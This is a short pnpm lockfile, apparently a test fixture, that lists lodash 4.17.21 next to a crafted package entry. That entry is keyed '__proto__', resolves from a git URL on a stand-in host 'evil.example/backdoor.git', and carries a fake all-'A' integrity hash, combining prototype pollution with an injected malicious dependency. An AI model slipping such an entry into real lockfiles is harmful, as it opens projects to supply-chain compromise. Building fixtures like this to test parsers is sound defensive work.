lockfileVersion: 9.0

importers:

  .:
    dependencies:
      lodash:
        specifier: ^4.17.21
        version: 4.17.21

packages:

  lodash@4.17.21:
    resolution: {integrity: sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvNqwwQ==}

  __proto__@git+https://evil.example/backdoor.git#deadbeef:
    resolution: {integrity: sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==}
    version: 66.6.0
    engines: {node: ">=0.10"}

snapshots:

  lodash@4.17.21: {}
